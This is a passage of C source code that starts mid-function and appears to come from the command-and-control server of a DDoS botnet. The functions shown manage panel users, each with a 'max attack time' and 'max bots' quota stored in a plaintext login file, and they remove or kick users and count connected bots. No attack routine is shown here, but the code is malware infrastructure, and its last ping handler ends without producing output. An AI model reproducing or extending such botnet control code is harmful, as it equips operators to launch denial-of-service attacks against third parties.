        snprintf(response, sizeof(response), LIGHT_BLUE "Password must be at least 4 characters\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    snprintf(response, sizeof(response), LIGHT_BLUE "Admin (y/n): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;

    char c;
    for (int i = 0; i < len; i++) {
        c = buffer[i];
        if (c == 'y' || c == 'Y' || c == 'n' || c == 'N') {
            is_admin = (c == 'y' || c == 'Y') ? 1 : 0;
            break;
        }
    }

    snprintf(response, sizeof(response), LIGHT_BLUE "Max attack time (seconds): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;
    buffer[strcspn(buffer, "\r\n")] = 0;
    
    if (sscanf(buffer, "%d", &maxtime) != 1 || maxtime <= 0) {
        snprintf(response, sizeof(response), LIGHT_BLUE "Invalid max time value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    // fix flows
    snprintf(response, sizeof(response), LIGHT_BLUE "Max bots: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;
    buffer[strcspn(buffer, "\r\n")] = 0;
    
    if (sscanf(buffer, "%d", &maxbots) != 1 || maxbots <= 0) {
        snprintf(response, sizeof(response), LIGHT_BLUE "Invalid max bots value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    FILE *fp = fopen("database/logins.txt", "a");
    if (!fp) {
        snprintf(response, sizeof(response), LIGHT_BLUE "Error: Could not open user database\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    
    fprintf(fp, "%s %s %d %d %s\n", newuser, newpass, maxtime, maxbots, is_admin ? "admin" : "0");
    fclose(fp);

    if (user_count < MAX_USERS) {
        strncpy(users[user_count].user, newuser, sizeof(users[user_count].user)-1);
        users[user_count].user[sizeof(users[user_count].user)-1] = 0;
        strncpy(users[user_count].pass, newpass, sizeof(users[user_count].pass)-1);
        users[user_count].pass[sizeof(users[user_count].pass)-1] = 0;
        users[user_count].maxtime = maxtime;
        users[user_count].maxbots = maxbots;
        users[user_count].is_admin = is_admin;
        users[user_count].is_logged_in = 0;
        user_count++;
    }

    snprintf(response, sizeof(response), 
        LIGHT_BLUE "User added successfully:\r\n"
        "Username: %s\r\n"
        "Max time: %d\r\n"
        "Max bots: %d\r\n"
        "Admin: %s\r\n" RESET,
        newuser, maxtime, maxbots, is_admin ? "yes" : "no");
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
}

void handle_removeuser_command(const User *user, const char *command, char *response) {
    FILE *sf = fopen("database/settings.txt", "r");
    char rootuser[50] = {0};
    int is_root = 0;
    
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %49s", rootuser);
                if (strcmp(user->user, rootuser) == 0) {
                    is_root = 1;
                }
                break;
            }
        }
        fclose(sf);
    }

    if (!is_root) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Only root user can remove users\r\n" RESET);
        return;
    }    char target[50];
    if (sscanf(command, "!removeuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Usage: !removeuser <username>\r\n" RESET);
        return;
    }

    if (strcmp(target, rootuser) == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Cannot remove root user\r\n" RESET);
        return;
    }

    FILE *f = fopen("database/logins.txt", "r");
    FILE *temp = fopen("database/logins.tmp", "w");
    if (!f || !temp) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Failed to remove user\r\n" RESET);
        if (f) fclose(f);
        if (temp) fclose(temp);
        return;
    }

    char line[256];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char current[50];
        if (sscanf(line, "%49s", current) == 1) {
            if (strcmp(current, target) != 0) {
                fputs(line, temp);
            } else {
                found = 1;
            }
        }
    }

    fclose(f);
    fclose(temp);

    if (found) {
        remove("database/logins.txt");
        rename("database/logins.tmp", "database/logins.txt");
        load_users();
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User %s removed\r\n" RESET, target);
    } else {
        remove("database/logins.tmp");
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User not found\r\n" RESET);
    }
}

void handle_kickuser_command(const User *user, const char *command, char *response) {
    static char target[50];
    static int allow_non_admin;
    static int found;
    
    if (!user->is_admin) {
        FILE *sf = fopen("database/settings.txt", "r");
        allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Error: You need to be admin or have globalstopall enabled to kick users\r\n" RESET);
            return;
        }
    }

    if (sscanf(command, "!kickuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Usage: !kickuser <username>\r\n" RESET);
        return;
    }

    found = 0;
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) {
            if (!users[i].is_logged_in) {
                snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User not connected\r\n" RESET);
                return;
            }
            if (user_sockets[i] > 0) {
                shutdown(user_sockets[i], SHUT_RDWR);
                close(user_sockets[i]);
                user_sockets[i] = 0;
            }
            users[i].is_logged_in = 0;
            found = 1;
            break;
        }
    }

    if (found) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Kicked user %s\r\n" RESET, target);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User not found\r\n" RESET);
    }
}

void handle_admin_command(const User *user, char *response) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Only admins can use !admin command\r\n" RESET);
        return;
    }
    
    snprintf(response, MAX_COMMAND_LENGTH,
             LIGHT_BLUE "Admin Commands:\r\n"
             "!adduser - Add a new user\r\n"
             "!removeuser <username> - Remove a user\r\n"
             "!kickuser <username> - Kick a connected user\r\n" RESET);
}

void handle_ping_command(char *response) {
    int valid_bots = 0;
    pthread_mutex_lock(&bot_mutex);
    int count = bot_count;
    if (count > MAX_BOTS) count = MAX_BOTS;
    for (int i = 0; i < count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
    }
    pthread_mutex_unlock(&bot_mutex);
}
